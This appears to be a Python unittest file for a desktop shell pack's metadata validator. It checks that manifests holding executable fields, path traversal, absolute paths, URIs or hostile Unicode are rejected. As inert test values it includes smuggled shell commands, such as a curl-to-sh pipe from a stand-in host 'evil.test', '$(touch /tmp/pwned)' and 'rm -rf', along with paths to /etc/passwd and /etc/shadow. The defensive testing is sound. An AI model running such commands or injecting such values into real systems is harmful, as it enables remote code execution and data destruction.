"""Offline unit tests for data-only untrusted pack metadata handling.

No Qt, no pack install, no network and no code execution. Every dangerous
value below stays inert: it is parsed as data and rejected or projected.
"""


from dataclasses import FrozenInstanceError
import json
from pathlib import Path
import shutil
import tempfile
import unittest

from canopy_features.security.pack_manifest_metadata import (
    MAX_FIELDS,
    SafePackMetadata,
    safe_metadata_from_pack,
    to_safe_metadata,
)
from tools.check_shell_pack import PackValidationError


ROOT = Path(__file__).resolve().parents[1]
STARTER = ROOT / "examples" / "shell-pack-starter"


def valid_manifest():
    """A schema-shaped, untrusted metadata mapping used as the safe baseline."""
    return {
        "manifest_version": 1,
        "id": "com.community.calm.desktop",
        "name": "Calm Desktop",
        "description": "An original Canopy presentation pack",
        "shell_api": 1,
        "kind": "presentation",
        "ui_engine": "qt-qml",
        "entrypoint": "ui/Main.qml",
        "capabilities": ["dock", "app-launcher"],
        "switch_strategy": "same-session",
        "permissions": [],
    }


class DataOnlyMetadataTests(unittest.TestCase):
    def setUp(self):
        self.manifest = valid_manifest()

    def project(self):
        return to_safe_metadata(self.manifest)

    def reject(self, reason):
        with self.assertRaisesRegex(PackValidationError, reason):
            self.project()

    # --- data-only projection -------------------------------------------------

    def test_valid_metadata_projects_to_immutable_data(self):
        result = self.project()
        self.assertIsInstance(result, SafePackMetadata)
        self.assertEqual(result.pack_id, "com.community.calm.desktop")
        self.assertEqual(result.name, "Calm Desktop")
        self.assertEqual(result.capabilities, frozenset({"dock", "app-launcher"}))
        with self.assertRaises(FrozenInstanceError):
            result.name = "Mutated"

    def test_capabilities_are_an_immutable_frozenset(self):
        self.assertIsInstance(self.project().capabilities, frozenset)

    def test_safe_relative_entrypoint_value_is_allowed(self):
        # "ui/Main.qml" is an in-pack path; data-only handling must not treat a
        # safe relative value as traversal or an executable field.
        self.manifest["entrypoint"] = "ui/Main.qml"
        self.assertEqual(self.project().name, "Calm Desktop")

    def test_output_keeps_no_path_or_command(self):
        result = self.project()
        self.assertEqual(
            set(vars(result)),
            {"pack_id", "name", "description", "capabilities"},
        )
        for value in vars(result).values():
            self.assertIsInstance(value, (str, frozenset))

    def test_non_mapping_input_rejected(self):
        for bad in (["x"], "text", 42, None):
            with self.subTest(bad=bad):
                with self.assertRaisesRegex(PackValidationError, "must be a mapping"):
                    to_safe_metadata(bad)

    # --- executable-looking fields -------------------------------------------

    def test_executable_key_command_rejected(self):
        self.manifest["command"] = "true"
        self.reject("executable-looking metadata field")

    def test_executable_key_script_rejected(self):
        self.manifest["run_script"] = "echo hi"
        self.reject("executable-looking metadata field")

    def test_executable_key_hook_rejected(self):
        self.manifest["on_load"] = "import os"
        self.reject("executable-looking metadata field")

    def test_executable_value_with_chained_command_rejected(self):
        self.manifest["name"] = "Calm; curl https://evil.test/x | sh"
        self.reject("executable-looking metadata value")

    def test_executable_value_command_substitution_rejected(self):
        self.manifest["description"] = "$(touch /tmp/pwned)"
        self.reject("executable-looking metadata value")

    def test_executable_value_backticks_rejected(self):
        self.manifest["name"] = "`whoami`"
        self.reject("executable-looking metadata value")

    def test_executable_value_interpreter_flag_rejected(self):
        self.manifest["description"] = "python -c 'import os'"
        self.reject("executable-looking metadata value")

    def test_executable_value_code_call_rejected(self):
        self.manifest["description"] = "subprocess.Popen(['ls'])"
        self.reject("executable-looking metadata value")

    def test_nested_executable_key_rejected(self):
        self.manifest["extra"] = {"callback": "run_me"}
        self.reject("executable-looking metadata field")

    def test_nested_executable_value_rejected(self):
        self.manifest["extra"] = {"notes": ["safe", "rm -rf /tmp/x"]}
        self.reject("executable-looking metadata value")

    # --- path traversal and unsafe paths -------------------------------------

    def test_relative_path_traversal_rejected(self):
        self.manifest["description"] = "../../etc/passwd"
        self.reject("path traversal")

    def test_windows_style_traversal_rejected(self):
        self.manifest["description"] = "..\\..\\secret"
        self.reject("path traversal")

    def test_windows_absolute_path_rejected(self):
        self.manifest["name"] = "C:\\Windows\\System32\\cmd.exe"
        self.reject("absolute path")

    def test_unc_path_rejected(self):
        self.manifest["description"] = "\\\\server\\share"
        self.reject("absolute path")

    def test_posix_absolute_path_rejected(self):
        self.manifest["description"] = "/etc/shadow"
        self.reject("absolute path")

    def test_uri_values_rejected(self):
        for bad in ("file:///etc/passwd", "https://evil.test/x", "data:text/plain,x"):
            with self.subTest(bad=bad):
                self.manifest["description"] = bad
                self.reject("URI in metadata value")

    def test_traversal_in_list_value_rejected(self):
        self.manifest["extra"] = ["ok", "..\\..\\outside"]
        self.reject("path traversal")

    # --- strict display-field extraction and bounds --------------------------

    def test_non_string_name_rejected(self):
        self.manifest["name"] = 123
        self.reject("invalid name")

    def test_unknown_capability_rejected(self):
        self.manifest["capabilities"] = ["dock", "root-access"]
        self.reject("invalid capabilities")

    def test_duplicate_capabilities_rejected(self):
        self.manifest["capabilities"] = ["dock", "dock"]
        self.reject("invalid capabilities")

    def test_too_many_fields_rejected(self):
        for index in range(MAX_FIELDS):
            self.manifest[f"field_{index}"] = "safe"
        self.reject("too many fields")

    def test_oversized_string_rejected(self):
        self.manifest["description"] = "x" * 2_049
        self.reject("string too long")


class UnicodeDisplaySafetyTests(unittest.TestCase):
    """Bounded hostile Unicode strings must fail closed at the projection gate.

    A lone surrogate passed the ASCII-only control check at 531a0cf, survived
    into the projected display string and raised a raw UnicodeEncodeError when
    that string was later written to a log or shown in settings. Unassigned,
    private-use and line/paragraph-separating code points have the same shape.
    """

    def setUp(self):
        self.manifest = valid_manifest()

    def project(self, **changes):
        manifest = dict(self.manifest)
        manifest.update(changes)
        return to_safe_metadata(manifest)

    @staticmethod
    def label(text):
        return text.encode("unicode_escape").decode("ascii")

    def test_lone_surrogate_in_display_values_fails_closed(self):
        for field in ("name", "description"):
            for bad in ("Calm\ud800Desktop", "Calm\udfffDesktop"):
                with self.subTest(field=field, bad=self.label(bad)):
                    with self.assertRaises(PackValidationError):
                        self.project(**{field: bad})

    def test_noncharacter_private_use_and_line_separator_fail_closed(self):
        for bad in ("Calm\ufffeDesktop",   # Cn noncharacter
                    "Calm\ue000Desktop",   # Co private use
                    "Calm\u2028Desktop",   # Zl line separator
                    "Calm\u2029Desktop"):  # Zp paragraph separator
            with self.subTest(bad=self.label(bad)):
                with self.assertRaises(PackValidationError):
                    self.project(name=bad)

    def test_projected_strings_are_utf8_encodable(self):
        result = self.project()
        for value in vars(result).values():
            if isinstance(value, str):
                value.encode("utf-8")

    def test_legitimate_unicode_display_names_still_project(self):
        for good in ("Café — Démo", "Cafe\u0301 Desk", "नमस्ते डेस्कटॉप",
                     "Calm 😊 Desktop", "Calm Desktop"):
            with self.subTest(good=self.label(good)):
                self.assertEqual(self.project(name=good).name, good)


class SafeMetadataFromPackTests(unittest.TestCase):
    """Confirm the helper reuses the existing v1 pack validator."""

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.pack = Path(self.temp.name) / "pack"
        shutil.copytree(STARTER, self.pack)

    def write_manifest(self, manifest):
        (self.pack / "manifest.json").write_text(
            json.dumps(manifest), encoding="utf-8"
        )

    def test_valid_starter_pack_is_projected(self):
        result = safe_metadata_from_pack(self.pack)
        self.assertEqual(result.pack_id, "org.example.canopy.minimal")
        self.assertEqual(result.name, "Minimal Example")

    def test_pack_with_executable_extra_field_fails_closed(self):
        manifest = json.loads((self.pack / "manifest.json").read_text(encoding="utf-8"))
        manifest["execute_script"] = "/bin/sh"
        self.write_manifest(manifest)
        with self.assertRaises(PackValidationError):
            safe_metadata_from_pack(self.pack)

    def test_pack_with_traversal_entrypoint_fails_closed(self):
        manifest = json.loads((self.pack / "manifest.json").read_text(encoding="utf-8"))
        manifest["entrypoint"] = "ui/../../etc/passwd"
        self.write_manifest(manifest)
        with self.assertRaises(PackValidationError):
            safe_metadata_from_pack(self.pack)


if __name__ == "__main__":
    unittest.main()
